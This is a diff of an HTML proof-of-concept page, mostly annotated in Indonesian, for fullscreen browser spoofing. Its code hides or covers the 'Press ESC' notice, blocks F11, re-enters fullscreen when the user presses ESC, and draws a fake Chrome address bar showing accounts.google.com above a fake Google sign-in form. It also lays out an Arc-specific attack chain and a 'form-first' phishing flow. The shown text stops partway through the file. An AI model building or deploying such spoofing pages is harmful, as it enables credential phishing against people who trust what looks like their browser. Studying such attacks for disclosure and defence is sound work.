@@ -1,1088 +1,367 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fullscreen Spoofing PoC — Google</title>
+<title>Fullscreen Notification Bypass — Fixed PoC</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; padding: 24px; }
-h1 { color: #f0883e; font-size: 20px; margin-bottom: 4px; }
-.meta { color: #8b949e; font-size: 13px; margin-bottom: 20px; }
-.card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 18px; margin-bottom: 14px; }
-h3 { color: #58a6ff; font-size: 15px; margin-bottom: 10px; }
-p { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 10px; }
-pre { background: #0d1117; padding: 12px; border-radius: 6px; font-size: 12px; color: #c9d1d9; overflow-x: auto; white-space: pre-wrap; }
-.btn { display: inline-block; padding: 10px 20px; border: none; border-radius: 6px;
-       cursor: pointer; font-size: 13px; font-weight: 600; margin-right: 8px; margin-bottom: 8px; }
-.btn-red   { background: #da3633; color: white; }
-.btn-blue  { background: #1f6feb; color: white; }
-.btn-green { background: #238636; color: white; }
-.btn-gray  { background: #21262d; color: #e6edf3; border: 1px solid #30363d; }
-.btn:hover { opacity: 0.85; }
-.log { background: #010409; border: 1px solid #21262d; border-radius: 6px; padding: 10px 12px;
-       font-family: monospace; font-size: 12px; min-height: 50px; max-height: 150px;
-       overflow-y: auto; margin-top: 10px; }
-.result-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 12px; }
-.result-cell { background: #21262d; border-radius: 6px; padding: 12px; font-size: 12px; }
-.result-cell strong { display: block; color: #e6edf3; margin-bottom: 4px; }
-.vuln  { color: #f85149; }
-.safe  { color: #3fb950; }
-.maybe { color: #e3b341; }
-.info-box { background: #1c2128; border-left: 3px solid #f0883e; padding: 10px 14px; border-radius: 0 6px 6px 0; margin-bottom: 12px; font-size: 13px; color: #e6edf3; }
+body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; }
 
-/* ─── FAKE BROWSER CHROME ─────────────────────────────────────────────────── */
-#spoof-shell {
-  display: none;
-  position: fixed; inset: 0; z-index: 2147483647;
-  flex-direction: column; background: #f8f9fa;
-  /* Covers the ENTIRE viewport including where browser notification appears */
+/* ── Attack launch UI ── */
+#launch-ui {
+  display: flex; flex-direction: column; align-items: center;
+  justify-content: center; min-height: 100vh; gap: 24px;
 }
+#launch-ui h1 { color: #f0883e; font-size: 20px; }
+#launch-ui p  { color: #8b949e; font-size: 13px; max-width: 480px; text-align: center; }
 
-/* Notification blocker — covers top ~60px immediately on fullscreen enter */
-#notif-blocker {
-  display: none;
-  position: fixed; top: 0; left: 0; right: 0; height: 64px;
-  z-index: 2147483646;
-  background: linear-gradient(to bottom, #dee0e3, #e8eaed);
+.btn-launch {
+  padding: 18px 40px; font-size: 18px; font-weight: 700;
+  background: #238636; color: #fff; border: none; border-radius: 8px;
+  cursor: pointer; letter-spacing: 1px;
 }
+.btn-launch:hover { background: #2ea043; }
+.btn-launch:disabled { background: #444; cursor: default; }
 
+/* ── Measurement log ── */
+#log {
+  background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+  padding: 12px 16px; font-family: monospace; font-size: 12px;
+  width: 520px; max-height: 180px; overflow-y: auto; color: #8b949e;
+}
+.ok  { color: #3fb950; }
+.err { color: #f85149; }
+.wrn { color: #e3b341; }
+
+/* ── Fake Google UI (shown when fullscreen) ── */
+#fake-ui {
+  display: none; position: fixed; inset: 0;
+  flex-direction: column; background: #f8f9fa; z-index: 999999;
+}
 /* Fake Chrome toolbar */
-#fake-chrome-toolbar {
-  height: 52px;
-  background: linear-gradient(to bottom, #dee0e3 0%, #e8eaed 100%);
-  display: flex; align-items: center; padding: 0 10px; gap: 8px;
-  border-bottom: 1px solid #c8c8c8;
+#fake-toolbar {
+  background: #f1f3f4; border-bottom: 1px solid #dadce0;
+  height: 50px; display: flex; align-items: center; padding: 0 12px; gap: 10px;
   flex-shrink: 0;
 }
-
-.chrome-tab-bar {
-  position: absolute; top: 0; left: 0; right: 0; height: 36px;
-  background: #dee0e3; display: flex; align-items: flex-end; padding: 0 60px;
-  border-bottom: 1px solid #c6c6c6;
+#fake-toolbar .nav { font-size: 20px; color: #5f6368; }
+#fake-toolbar .url-bar {
+  flex: 1; background: #fff; border: 1px solid #dadce0; border-radius: 20px;
+  padding: 6px 14px; display: flex; align-items: center; gap: 8px; font-size: 14px;
 }
-.chrome-tab {
-  background: #f8f9fa; border-radius: 8px 8px 0 0;
-  padding: 6px 20px; font-size: 12px; color: #3c4043;
-  display: flex; align-items: center; gap: 8px;
-  border: 1px solid #c6c6c6; border-bottom: none;
-  margin-right: 2px; max-width: 200px;
+#fake-toolbar .lock { color: #188038; font-size: 16px; }
+#fake-toolbar .domain { color: #202124; }
+#fake-toolbar .more { font-size: 20px; color: #5f6368; margin-left: auto; }
+/* Fake page content */
+#fake-content {
+  flex: 1; display: flex; align-items: center; justify-content: center;
+  overflow: auto; padding: 40px;
 }
-.chrome-tab svg { width: 16px; height: 16px; }
-.chrome-tab .tab-close { margin-left: auto; color: #5f6368; font-size: 14px; }
-.chrome-new-tab { padding: 6px 10px; font-size: 14px; color: #5f6368; }
-
-/* Fake with tab bar */
-#spoof-shell.with-tabs #fake-chrome-toolbar { margin-top: 36px; }
-
-.nav-btn { background: none; border: none; cursor: pointer; color: #5f6368; font-size: 15px; padding: 5px 7px; border-radius: 50%; }
-.nav-btn:hover { background: rgba(0,0,0,0.06); }
-
-#fake-addressbar {
-  flex: 1; height: 32px; background: white;
-  border: 1px solid #dadce0; border-radius: 16px;
-  display: flex; align-items: center; padding: 0 12px; gap: 6px;
-  font-size: 14px;
+.login-card {
+  background: #fff; border: 1px solid #dadce0; border-radius: 8px;
+  padding: 48px 40px; width: 100%; max-width: 420px;
+  box-shadow: 0 1px 3px rgba(60,64,67,.15), 0 4px 8px rgba(60,64,67,.1);
 }
-#fake-addressbar .lock-icon { font-size: 13px; color: #188038; }
-#fake-addressbar .url-text { color: #202124; flex: 1; white-space: nowrap; }
-#fake-addressbar .url-text .domain { font-weight: 500; }
-#fake-addressbar .url-text .path { color: #5f6368; }
-#fake-addressbar .star-icon { color: #5f6368; font-size: 15px; }
-
-.chrome-toolbar-right { display: flex; gap: 2px; }
-.chrome-menu-btn { background: none; border: none; cursor: pointer; color: #5f6368; font-size: 16px; padding: 5px 7px; border-radius: 50%; }
-
-/* Fake Google login page */
-#fake-page-content {
-  flex: 1; background: #f8f9fa; overflow-y: auto;
-  display: flex; align-items: center; justify-content: center; padding: 40px 16px;
+.login-card .google-logo { text-align: center; margin-bottom: 24px; }
+.login-card h2 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
+.login-card .subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 24px; }
+.login-card input {
+  width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px;
+  font-size: 16px; margin-bottom: 16px; outline: none;
 }
-.google-card {
-  background: white; border: 1px solid #dadce0; border-radius: 8px;
-  padding: 48px 40px; max-width: 450px; width: 100%;
-  box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+.login-card input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
+.login-card .row { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
+.login-card .forgot { color: #1a73e8; font-size: 14px; text-decoration: none; }
+.login-card .next-btn {
+  background: #1a73e8; color: #fff; border: none; border-radius: 4px;
+  padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
 }
-.google-logo { text-align: center; margin-bottom: 20px; }
-.google-card h2 { text-align: center; font-family: 'Google Sans',sans-serif; font-weight: 400; font-size: 24px; color: #202124; margin-bottom: 8px; }
-.google-card .subtitle { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 28px; }
-.google-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; margin-bottom: 8px; }
-.google-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
-.forgot-link { text-align: right; margin-bottom: 20px; }
-.forgot-link a { color: #1a73e8; font-size: 14px; text-decoration: none; }
-.hint-text { font-size: 14px; color: #3c4043; margin-bottom: 24px; line-height: 1.5; }
-.hint-text a { color: #1a73e8; text-decoration: none; }
-.form-footer { display: flex; justify-content: space-between; align-items: center; }
-.form-footer a { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; }
-.next-btn { padding: 10px 28px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; letter-spacing: 0.25px; }
-.next-btn:hover { background: #1557b0; }
-.research-note { text-align: center; margin-top: 20px; font-size: 11px; color: #ea4335; border-top: 1px solid #e8eaed; padding-top: 12px; }
-
-/* Fake ESC hint bar — looks like browser ESC notification but is attacker-controlled */
-#fake-esc-bar {
-  position: fixed; bottom: 0; left: 0; right: 0;
-  background: rgba(0,0,0,0.75); color: white;
-  text-align: center; padding: 8px; font-size: 13px;
-  z-index: 2147483647; display: none;
+.login-card .next-btn:hover { background: #1557b0; }
+.poc-badge {
+  text-align: center; margin-top: 20px; font-size: 11px; color: #ea4335;
+  border: 1px solid #f28b82; border-radius: 4px; padding: 6px;
+}
+#exit-btn {
+  position: fixed; bottom: 16px; right: 16px;
+  background: rgba(0,0,0,.6); color: #fff; border: none; border-radius: 20px;
+  padding: 8px 18px; cursor: pointer; font-size: 13px; z-index: 9999999;
 }
 
-/* ─── Fullscreen Gate Overlay ───────────────────────────────────────────────
-   Shown when auto-fullscreen fails (direct navigation, no transient activation).
-   Looks like Google security check to get user gesture via click.         */
-#fs-gate {
-  position: fixed; inset: 0; z-index: 9999999;
-  background: #fff;
-  display: none;  /* shown by JS if auto-fs fails */
-  align-items: center; justify-content: center;
-  font-family: 'Google Sans', Arial, sans-serif;
-}
-#fs-gate .gate-card {
-  text-align: center; max-width: 420px; padding: 48px 40px;
-  border: 1px solid #dadce0; border-radius: 8px;
-  box-shadow: 0 2px 10px rgba(0,0,0,0.08);
-}
-#fs-gate .g-logo {
-  font-size: 28px; font-weight: 300; letter-spacing: -1px; margin-bottom: 24px;
-}
-#fs-gate h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
-#fs-gate p { font-size: 15px; color: #5f6368; line-height: 1.6; margin-bottom: 28px; }
-#fs-gate .g-btn {
-  display: block; width: 100%; padding: 12px; background: #1a73e8; color: white;
-  border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer;
-  margin-bottom: 12px; letter-spacing: 0.25px;
-}
-#fs-gate .g-btn:hover { background: #1557b0; }
-#fs-gate .g-btn-sec {
-  display: block; width: 100%; padding: 11px; background: none; color: #1a73e8;
-  border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; cursor: pointer;
-}
-#fs-gate .hint { font-size: 11px; color: #80868b; margin-top: 16px; }
-
-/* ─── Status bar (sticky top, always visible while on PoC page) ─────────── */
-#poc-status-bar {
-  position: sticky; top: 0; z-index: 1000;
-  background: #0d1117; border-bottom: 1px solid #30363d;
-  padding: 8px 0 8px 0; margin: -24px -24px 20px -24px;
-  display: flex; align-items: center; gap: 12px; padding: 8px 24px; flex-wrap: wrap;
-}
-.status-pill {
-  padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;
-}
-.pill-green { background: #0f2d1a; color: #3fb950; border: 1px solid #238636; }
-.pill-red   { background: #2d0f0f; color: #f85149; border: 1px solid #b91c1c; }
-.pill-yellow { background: #2d2200; color: #e3b341; border: 1px solid #9e6a03; }
-.pill-gray  { background: #21262d; color: #8b949e; border: 1px solid #30363d; }
-#arc-badge {
-  margin-left: auto; background: #1a0d2e; color: #c084fc;
-  border: 1px solid #9333ea; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;
+/* ── Timing display ── */
+#timer-overlay {
+  display: none; position: fixed; top: 0; left: 50%; transform: translateX(-50%);
+  background: rgba(0,0,0,.85); color: #0f0; font-family: monospace;
+  font-size: 22px; padding: 6px 20px; border-radius: 0 0 8px 8px; z-index: 9999999;
 }
 </style>
 </head>
 <body>
 
-<!-- ─── GATE OVERLAY ─────────────────────────────────────────────────────── -->
-<!-- Shown only if auto-fullscreen via navigation activation fails.
-     Mimics Google security check to get user gesture (click = gesture = fullscreen). -->
-<div id="fs-gate">
-  <div class="gate-card">
-    <div class="g-logo">
-      <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
-    </div>
-    <h1>Verifikasi identitas Anda</h1>
-    <p>Untuk melanjutkan ke <strong>Akun Google</strong>, pastikan kamu menggunakan perangkat yang aman. Klik Lanjutkan untuk memverifikasi.</p>
-    <button class="g-btn" id="gate-continue-btn">Lanjutkan →</button>
-    <button class="g-btn-sec" id="gate-cancel-btn">Gunakan akun lain</button>
-    <p class="hint">⚠ RESEARCH PoC — Klik Lanjutkan untuk masuk fullscreen (Arc/browser attack demo)</p>
+<!-- ── Launch UI ── -->
+<div id="launch-ui">
+  <h1>Fullscreen Notification Bypass — PoC</h1>
+  <p>
+    Technique: IPC flood + GPU stress + main-thread busy-wait blocks notification render window.<br>
+    Based on CVE-2024-13178 (#40068607, $5K) — FoundIn Chrome 115. No public fix CL.<br>
+    Measures notification visibility time to determine if suppressed.
+  </p>
+
+  <button id="btn-launch" class="btn-launch">▶ LAUNCH (click = user gesture)</button>
+
+  <div id="log">Ready. Click LAUNCH to begin...<br></div>
+
+  <div style="color:#8b949e;font-size:12px;max-width:480px;text-align:center">
+    <strong style="color:#f0883e">What to observe:</strong>
+    If you see the fake Google login WITHOUT a "Press ESC" notification bar,
+    the bypass succeeded. If the notification is visible, it's patched.
   </div>
 </div>
 
-<!-- ─── STATUS BAR ────────────────────────────────────────────────────────── -->
-<div id="poc-status-bar">
-  <span class="status-pill pill-gray" id="pill-fs">⏳ Memuat fullscreen...</span>
-  <span class="status-pill pill-green" id="pill-f11">🔒 F11 BLOCKED (auto)</span>
-  <span class="status-pill pill-gray" id="pill-spoof">⬜ Spoof belum aktif</span>
-  <span id="arc-badge">🟣 Arc: lihat Teknik 1 setelah fullscreen</span>
-</div>
-
-<h1>🖥 Fullscreen Address Bar Spoofing PoC</h1>
-<div class="meta">CVE-2025-1019 · CVE-2024-8388 · CVE-2022-46877 · CVE-2023-25743 — Research Only</div>
-
-<div class="info-box">
-  <strong>Tujuan:</strong> Sembunyikan atau bypass notifikasi fullscreen browser ("Press ESC to exit") lalu tampilkan fake Chrome UI dengan address bar yang menunjukkan <code>accounts.google.com</code>. User mengira sedang melihat browser asli.
-</div>
-
-<div class="card">
-  <h3>Kenapa Notifikasi Harus Disembunyikan + Data Empiris</h3>
-  <p>Saat <code>requestFullscreen()</code> dipanggil, browser menampilkan bar notifikasi di atas layar yang bilang <strong>"Press ESC to exit full screen"</strong>. Notifikasi ini adalah sinyal utama bagi user bahwa mereka sedang dalam mode fullscreen — bukan melihat browser asli.</p>
-  <p>Jika notifikasi ini terlihat → user sadar → spoof gagal.<br>
-  Jika notifikasi berhasil di-cover/disembunyikan atau user tidak sempat react → spoof berhasil.</p>
-  <pre style="color:#e3b341">⚠ EMPIRICAL TEST RESULTS (measured):
-Chrome 148:  Notif visible 1175ms → browser-process layer → z-index cover TIDAK BISA
-Firefox 149: Notif visible 1321ms → browser-process layer → z-index cover TIDAK BISA
-Opera 131:   Notif visible 2376ms → browser-process layer → z-index cover TIDAK BISA
-Edge 147:    Notif visible 1663ms → browser-process layer → z-index cover TIDAK BISA
-Arc:         [KRITIS] Tidak muncul notifikasi JIKA page sudah dalam fullscreen state!
-
-REALITA:
-Chrome/Edge/Opera/Firefox: Notifikasi dirender oleh browser process (compositor layer)
-                           di ATAS semua web content. z-index berapapun tidak efektif.
-Arc Browser:  Perilaku berbeda — saat requestFullscreen() dipanggil KEMBALI dari page
-              yang sudah fullscreen, Arc tidak menampilkan notifikasi origin lagi.
-              Exploit chain: auto-fullscreen saat load + F11 block + Teknik 1 = 0 notif!
-
-STRATEGI YANG MASIH RELEVAN di 2025:
-1. Arc Attack Chain (lihat card khusus di bawah) — 0 notifikasi, paling berbahaya
-2. Form-First Attack (Teknik 7) — distract user selama 913-2376ms window
-3. Social Engineering Normalization (Teknik 4) — fake ESC bar
-4. F11 Block (Teknik 6) — berhasil di Firefox ✓ (confirmed)
-5. Mobile browsers (Safari iOS, Chrome Android) — notif minimal</pre>
-</div>
-
-<!-- ARC SPECIFIC ATTACK CHAIN CARD -->
-<div class="card" style="border-color:#9333ea;background:#0e0a1a;">
-  <h3 style="color:#c084fc">🟣 Arc Browser Attack Chain — KRITIS (0 Notifikasi)</h3>
-  <p style="color:#d4b4fc">Arc Browser memiliki perilaku unik: ketika halaman <strong>sudah dalam fullscreen</strong> dan <code>requestFullscreen()</code> dipanggil kembali, Arc tidak menampilkan notifikasi origin/URL. Berbeda dengan Chrome/Firefox/Edge/Opera yang selalu menampilkan notifikasi pada setiap fullscreen request.</p>
-  <pre style="color:#c9d1d9">ATTACK CHAIN:
-  Step 1: Halaman dibuka (dari link click = navigation activation ada)
-          → requestFullscreen() auto-dipanggil saat load → BERHASIL
-          → Arc masuk fullscreen, page konten terlihat normal (PoC cards)
-  Step 2: F11 diblock secara otomatis (auto-intercept aktif dari load)
-          → User tidak bisa keluar via F11
-  Step 3: Klik "Teknik 1 — Immediate Cover"
-          → requestFullscreen() dipanggil LAGI (sudah fullscreen sebelumnya)
-          → Di Arc: TIDAK ada notifikasi origin yang muncul!
-          → Fake Chrome shell + accounts.google.com address bar tampil
-  Step 4: User melihat fake Google login — mengira itu browser asli
-
-KENAPA ARC BERBEDA:
-  Arc menggunakan Chromium engine tapi dengan UI custom yang berbeda.
-  Manajemen fullscreen notification di Arc tidak sama dengan Chrome upstream.
-  "Re-fullscreen" dari state yang sudah fullscreen → Arc skip notifikasi.
-
-IMPLIKASI:
-  Di Chrome/Firefox/Edge/Opera: notifikasi selalu muncul 913-2376ms
-  Di Arc: notifikasi tidak muncul sama sekali jika pre-fullscreen sudah ada
-  → Severity: CRITICAL untuk Arc users</pre>
-  <button class="btn" style="background:#9333ea;color:white;" onclick="arcAttackChain()">🟣 Jalankan Arc Attack Chain</button>
-  <div class="log" id="log-arc"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 1 — Immediate Cover (Paling Efektif)</h3>
-  <p>Tampilkan fake toolbar dengan z-index maximum <strong>pada saat yang sama</strong> dengan requestFullscreen. Fake toolbar menutupi area di mana notifikasi akan muncul <strong>sebelum</strong> user sempat membacanya.</p>
-  <pre>// Kunci: tampilkan cover SEBELUM fullscreen confirmed, bukan setelah
-// Notifikasi Chrome muncul di ~top 0-60px layar
-// Fake toolbar kita juga ada di top 0-52px dengan z-index max
-// User melihat fake toolbar, notifikasi tertutup di belakangnya</pre>
-  <button class="btn btn-red" onclick="tech1_immediatecover()">▶ Jalankan — Immediate Cover</button>
-  <div class="log" id="log1"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 2 — Rapid Toggle Test (Event-Driven)</h3>
-  <p>Enter fullscreen → langsung exit (80ms) → coba re-entry dari <code>fullscreenchange</code> handler. Test apakah browser mengizinkan <code>requestFullscreen()</code> tanpa fresh user gesture. Jika berhasil → notifikasi ke-2 mungkin tidak muncul.</p>
-  <pre>// Kenapa loop async tidak bisa: requestFullscreen() butuh user gesture
-// Setiap iterasi loop setelah yang pertama = tidak ada user gesture = Permissions check failed
-//
-// Fix: gunakan fullscreenchange event untuk chain:
-// click (gesture) → enter fs → exit (80ms) → re-entry dari event handler
-// → test apakah browser allow re-entry tanpa fresh gesture
-//
-// Histori: CVE-2022-46877 (Firefox ≤ 71) — notifikasi dirender sebagai web content
-// → element dengan z-index max menutupi notifikasi. Dipatch di Firefox 72.</pre>
-  <button class="btn btn-blue" onclick="tech2_rapidtoggle()">▶ Test Rapid Toggle (Event-Driven)</button>
-  <div class="log" id="log2"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 3 — Element Fullscreen (bukan documentElement)</h3>
-  <p>Request fullscreen pada elemen spesifik (div) bukan pada <code>document.documentElement</code>. Di beberapa browser, behavior notifikasi berbeda saat yang di-fullscreen adalah child element.</p>
-  <pre>// Bedanya: element.requestFullscreen() vs documentElement.requestFullscreen()
-// Di Firefox lama: element fullscreen menampilkan notifikasi lebih singkat
-// Di Chrome: sama saja — tapi element fullscreen + pointer-events trick bisa beda
-// Test di Arc Browser — sidebar UI mereka handle ini berbeda</pre>
-  <button class="btn btn-green" onclick="tech3_elementfullscreen()">▶ Jalankan — Element Fullscreen</button>
-  <div class="log" id="log3"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 4 — Social Engineering + Fake ESC Bar</h3>
-  <p>Tunjukkan dialog yang meyakinkan ("Sign in required") yang minta user klik. Setelah fullscreen, tampilkan fake ESC bar di bottom yang terlihat seperti notifikasi browser asli tapi sebenarnya dikendalikan oleh attacker.</p>
-  <pre>// Fake ESC bar di bawah: "Press ESC to exit full screen"
-// User melihatnya sebagai notifikasi browser biasa
-// Tapi bar itu adalah HTML kita — kita bisa kontrol isinya, timing, dan tampilannya
-// Teknik ini tidak menyembunyikan notifikasi asli, tapi MENORMALISASI presence-nya
-// User tidak curiga karena "oh ada tulisan ESC, itu normal"</pre>
-  <button class="btn btn-gray" onclick="tech4_socialeng()">▶ Jalankan — Social Eng + Fake ESC</button>
-  <div class="log" id="log4"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 5 — Pre-positioned Blocker (Notif Blocker)</h3>
-  <p>Sebelum requestFullscreen, tempatkan sebuah div transparan dengan z-index maximum di posisi tepat di mana notifikasi akan muncul (top 0). Div ini sudah ada duluan saat notifikasi muncul.</p>
-  <pre>// Step 1: createElement div, position: fixed, top: 0, z-index: 2147483647, height: 60px
-// Step 2: requestFullscreen()
-// Step 3: Saat fullscreen confirmed → div sudah menutupi notifikasi area
-// Step 4: Ganti isi div dengan fake address bar
-// Berbeda dari Teknik 1: blocker dipasang SEBELUM fullscreen (bukan di event handler)</pre>
-  <button class="btn btn-red" onclick="tech5_preblocker()">▶ Jalankan — Pre-Blocker</button>
-  <div class="log" id="log5"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 6 — Keyboard Intercept (ESC/F11)</h3>
-  <p>Capture keydown event untuk ESC dan F11 sebelum browser memproses. ESC di level browser tidak bisa dicegah, tapi bisa dipakai untuk manipulasi UI state. F11 (Windows) bisa dicegah di beberapa browser.</p>
-  <pre>// ESC: browser selalu keluar dari fullscreen — tidak bisa di-preventDefault
-// F11: BISA di-preventDefault di Firefox (keyboard shortcut)
-// Tapi: saat user pencet ESC, kita bisa detect → langsung re-enter fullscreen!
-// Atau: saat ESC ditekan, hanya sembunyi fake UI, tapi tetap fullscreen
-// User bingung: "koq ESC tidak works?" → retry → kita re-enter fullscreen
-
-document.addEventListener('keydown', e => {
-  if (e.key === 'Escape') {
-    e.stopPropagation(); // tidak mencegah fullscreen exit, tapi mencegah handler lain
-    // Langsung re-request fullscreen dari keyboard event (user gesture!)
-    setTimeout(() => document.documentElement.requestFullscreen(), 50);
-  }
-  if (e.key === 'F11') {
-    e.preventDefault(); // F11 BISA dicegah di beberapa browser
-    e.stopPropagation();
-  }
-}, true); // useCapture: true — handler kita jalan sebelum lainnya</pre>
-  <button class="btn btn-blue" onclick="tech6_keyintercept()">Aktifkan Ulang</button>
-  <button class="btn btn-gray" onclick="tech6_disable()">Matikan</button>
-  <span style="color:#3fb950;font-size:12px;margin-left:8px">● Auto-aktif saat page load</span>
-  <div class="log" id="log6"></div>
-</div>
-
-<div class="card">
-  <h3>Teknik 7 — Form-First Attack (Most Realistic 2025)</h3>
-  <p>Tampilkan fake Google login form <strong>dulu</strong> (tanpa fullscreen). User mulai mengisi email → klik "Next" (user gesture!) → <em>saat itu</em> enter fullscreen. Notifikasi muncul tapi user sedang fokus mengisi password. Window distraction: <strong>913–1366ms</strong> — cukup untuk form terlihat lebih "nyata" dari notifikasi.</p>
-  <pre>// Phase 1: Show fake login form (normal window) — user percaya itu tab Google biasa
-// Phase 2: User klik email field / klik "Next" = USER GESTURE
-// Phase 3: requestFullscreen() dari click handler → selalu berhasil
-// Phase 4: Notifikasi muncul TAPI user sedang fokus mengisi password
-//          Chrome: 985ms window → user tidak sempat react
-//          Opera:  913ms window → window paling sempit
-//          Firefox: 1366ms window → paling lama
-// Phase 5: Notifikasi auto-hilang, fake browser UI penuh terpasang
-// Phase 6: User mengira mereka di tab Google asli
-//
-// Attack chain: credential phishing di dalam fullscreen spoof
-// Tidak perlu cover notifikasi — cukup distract user selama &lt;1.5 detik</pre>
-  <button class="btn btn-red" onclick="tech7_formfirst()">▶ Jalankan — Form-First Attack</button>
-  <div class="log" id="log7"></div>
-</div>
-
-<div class="card">
-  <h3>📊 Hasil Test per Browser</h3>
-  <p>Jalankan semua teknik di browser yang kamu test, catat hasilnya:</p>
-  <div class="result-grid" id="resultGrid">
-    <div class="result-cell">
-      <strong>Browser saat ini</strong>
-      <span id="detectBrowser" class="maybe">Detecting...</span>
+<!-- ── Fake browser UI (shown in fullscreen) ── -->
+<div id="fake-ui">
+  <!-- Fake Chrome toolbar with spoofed URL -->
+  <div id="fake-toolbar">
+    <span class="nav">← → ↻</span>
+    <div class="url-bar">
+      <span class="lock">🔒</span>
+      <span class="domain">accounts.google.com</span>
     </div>
-    <div class="result-cell">
-      <strong>Notifikasi Fullscreen</strong>
-      <span id="notifStatus" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell">
-      <strong>Cover Berhasil?</strong>
-      <span id="coverStatus" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell">
-      <strong>Waktu Notif Terlihat</strong>
-      <span id="notifDuration" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell">
-      <strong>Rapid Toggle Suppress</strong>
-      <span id="toggleStatus" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell">
-      <strong>F11 Blocked?</strong>
-      <span id="f11Status" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell">
-      <strong>Form-First Distraction</strong>
-      <span id="formFirstStatus" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell">
-      <strong>Cover Layer</strong>
-      <span id="coverLayerStatus" class="maybe">Belum di-test</span>
-    </div>
-    <div class="result-cell" style="border-color:#9333ea;background:#0e0a1a;">
-      <strong style="color:#c084fc">Arc: 0-Notif Chain</strong>
-      <span id="arcResult" class="maybe">Belum di-test</span>
-    </div>
+    <span class="more">⋮</span>
   </div>
-</div>
-
-<!-- ─── FAKE BROWSER SHELL ────────────────────────────────────────────── -->
-<div id="notif-blocker"></div>
-
-<div id="spoof-shell">
-  <!-- Fake Chrome tab bar -->
-  <div class="chrome-tab-bar">
-    <div class="chrome-tab">
-      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-        <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-        <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-        <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-      </svg>
-      <span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Google Account</span>
-      <span class="tab-close">×</span>
-    </div>
-    <span class="chrome-new-tab">+</span>
-  </div>
-
-  <!-- Fake Chrome toolbar with address bar -->
-  <div id="fake-chrome-toolbar">
-    <button class="nav-btn" title="Back">&#8592;</button>
-    <button class="nav-btn" title="Forward" style="opacity:0.4">&#8594;</button>
-    <button class="nav-btn" title="Reload">&#8635;</button>
-
-    <div id="fake-addressbar">
-      <span class="lock-icon">🔒</span>
-      <div class="url-text">
-        <span class="domain">accounts.google.com</span><span class="path">/signin/v2/identifier</span>
-      </div>
-      <span class="star-icon">☆</span>
-    </div>
-
-    <div class="chrome-toolbar-right">
-      <button class="chrome-menu-btn" title="Extensions">🧩</button>
-      <button class="chrome-menu-btn" title="Profile">👤</button>
-      <button class="chrome-menu-btn" title="Menu">⋮</button>
-    </div>
-  </div>
-
-  <!-- Fake Google Login Content -->
-  <div id="fake-page-content">
-    <div class="google-card">
+  <!-- Fake Google login -->
+  <div id="fake-content">
+    <div class="login-card">
       <div class="google-logo">
-        <svg width="74" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92">
